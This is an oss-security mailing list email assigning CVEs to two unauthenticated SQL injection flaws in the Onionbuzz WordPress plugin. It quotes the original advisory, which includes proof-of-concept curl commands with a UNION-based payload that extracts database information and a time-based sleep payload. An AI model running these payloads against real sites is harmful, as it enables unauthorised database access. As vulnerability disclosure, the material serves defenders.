X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["2201" "Monday" "22" "July" "2019" "23:04:25" "-0400" "Eugene Kolo" "eugene@eugenekolo.com" "<CAN1YN0tUvJ4mE1WHDBeS_=BRt3M1iZ8p95hP8-3OU=_KgZrF3g@mail.gmail.com>" "69" "[oss-security] Re: Two unauthenticated SQL injection vulnerabilities in Onionbuzz WordPress plugin" nil nil nil "7" "2019072303:04:25" "[oss-security] Re: Two unauthenticated SQL injection vulnerabilities in Onionbuzz WordPress plugin" (number mark "U       eugene@eugen Jul 22   69/2201  " thread-indent "\"[oss-security] Re: Two unauthenticated SQL injection vulnerabilities in Onionbuzz WordPress plugin\"\n") "<CAN1YN0tHY1PbJ=WeUDs=ToCZ-_JetOhAnJwou3PCdcfsoFy9Cg@mail.gmail.com>" ("<CAN1YN0tHY1PbJ=WeUDs=ToCZ-_JetOhAnJwou3PCdcfsoFy9Cg@mail.gmail.com>") nil nil nil nil nil nil nil "[oss-security] Re: Two unauthenticated SQL injection vulnerabilities in Onionbuzz WordPress plugin" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 21793 invoked by uid 550); 23 Jul 2019 05:44:34 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 17820 invoked from network); 23 Jul 2019 03:04:49 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=eugenekolo.com; s=google;
        h=mime-version:references:in-reply-to:from:date:message-id:subject:to;
        bh=isn+iei7Hk0k9hiTwm6nM7CtHmx98GdoHJZT+oic/js=;
        b=N90s2EsLeOyYOZwwJUQhHoWZemPsHiz/la6+2PeOK6soY69tFIhvuUHm9tkuw6pxQR
         UmJD1rKrmE+6m5yuAW7gWZ6MxD+iyr6QX9a5kFU/8lFOQQ+Xv8/kyYhZS4Q/wZVu4UAe
         7S+y2x04HGU+ZzSS7dLXrjB6STEM0vJEPRj/M=
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:mime-version:references:in-reply-to:from:date
         :message-id:subject:to;
        bh=isn+iei7Hk0k9hiTwm6nM7CtHmx98GdoHJZT+oic/js=;
        b=JZfLKpoLJdm/jNhYy8/UYB++qK3imfXUMeRBF3bq6ag2CTa9YdjaFF9fB4nVMEEybb
         0u+gSkhHcGQoBG3GduaSxVPiX2EsZzCg1w8DNJmVKvxqI8r0JyJHcQBTWYQI37OWo34l
         OzAfF1aC5STOr1lSaDbO/G9pO0koMrOz7U9fvC3UqwZo1HD/fJL/AsGHYg8+c2eVfuE4
         5PYIDGQL58f9bfcx+NZzQdfLqTscasO1FuXxXA6j2JXYenQhbrjA6/Rk9qrmEv+9591t
         N9oQdxdnhF1jX0k9BqUsLOxyrt8k1wRb9OpRK5eOQ92HRWYQ6+Jok2wwjJQQ5PzI7nDm
         JAQw==
X-Gm-Message-State: APjAAAXhvMkfnQED6gQJpNvW6xmvTd/Qa1f0VPCCNYS3uX6XcgWclCO1
	3nyCYj2vReUjlLldSvBfNx/nMo6TwbcI7Bdp2lkjC5Nk9jo=
X-Google-Smtp-Source: APXvYqzP9ReCRlhBa03gymCoDte4IfqVnvovSQD4sNIA5IBH6/CLQgbAtzLfVPueIBEZeKhAMNU4P6dVPHqZ2swYUPM=
X-Received: by 2002:a17:902:2a27:: with SMTP id i36mr77148683plb.161.1563851077066;
 Mon, 22 Jul 2019 20:04:37 -0700 (PDT)
MIME-Version: 1.0
References: <CAN1YN0tHY1PbJ=WeUDs=ToCZ-_JetOhAnJwou3PCdcfsoFy9Cg@mail.gmail.com>
In-Reply-To: <CAN1YN0tHY1PbJ=WeUDs=ToCZ-_JetOhAnJwou3PCdcfsoFy9Cg@mail.gmail.com>
From: Eugene Kolo <eugene@eugenekolo.com>
Date: Mon, 22 Jul 2019 23:04:25 -0400
Message-ID: <CAN1YN0tUvJ4mE1WHDBeS_=BRt3M1iZ8p95hP8-3OU=_KgZrF3g@mail.gmail.com>
To: oss-security@lists.openwall.com
Content-Type: multipart/alternative; boundary="000000000000ee3295058e507314"
Subject: [oss-security] Re: Two unauthenticated SQL injection vulnerabilities in Onionbuzz
 WordPress plugin

--000000000000ee3295058e507314
Content-Type: text/plain; charset="UTF-8"

Assigned CVE-2019-14230 and CVE-2019-14231.

On Sat, Jul 20, 2019 at 6:35 PM Eugene Kolo <eugene@eugenekolo.com> wrote:

> Two unauthenticated/unprivileged SQL injection vulnerabilities in the
> Viral Quiz Maker - Onionbuzz WordPress plugin.
>
> Information
> ===========
> Affected Product: Viral Quiz Maker - OnionBuzz WordPress plugin
> Vendor Homepage: Onionbuzz.com
> Vulnerability Type: SQL Injection
> Discoverer: Eugene Kolodenker
> Date: July-20-2019
>
> 1)
>
> Description
> ===========
> Prior to v1.2.2, you could exploit the `points` parameter in the
> `ob_get_results` ajax nopriv handler due to there being no sanitization on
> the points argument. The points parameter is not sanitized prior to be used
> in a SQL query in getResultByPointsTrivia. This allows an
> unauthenticated/unprivileged user to perform a SQL injection attack capable
> of remote code execution and information disclosure.
>
> Proof of Concept (POC)
> ======================
> ```
> curl http://site/wp-admin/admin-ajax.php?action=ob_get_results --data
> "type=get_result&id=1&quiz_type=5&points=1 or 1=0 union all select
> 1,1,version(),table_name,1,1,1,1,1 from information_schema.tables;#"
> ```
>
> And get back:
> ```
> {"quiz_id":1,"points":"1 or 1=0 union all select
> 1,1,version(),table_name,1,1,1,1,1 from
> information_schema.tables;#","title":<DBVERSION>","description":"CHARACTER_SETS","featured_image":"<img
> src=\"1\">","image_caption":"1","is_image":1,"success":1}
> ```
>
>
> 2)
>
> Description
> ===========
> Prior to v1.2.7, you could exploit the `id` parameter in the `set_count`
> ajax nopriv handler due to there being no sanitization on the id argument.
> The id parameter is not sanitized prior to be used in a SQL query in
> saveQuestionVote. This allows an unauthenticated/unprivileged user to
> perform a SQL injection attack capable of remote code execution and
> information disclosure.
>
>
> Proof of Concept (POC)
> ======================
>
> ```
> curl http://site/wp-admin/admin-ajax.php?type=set_count --data
> "action=ob_question_votes&id=1 or sleep(10);#"
> ```
>
>

--000000000000ee3295058e507314--
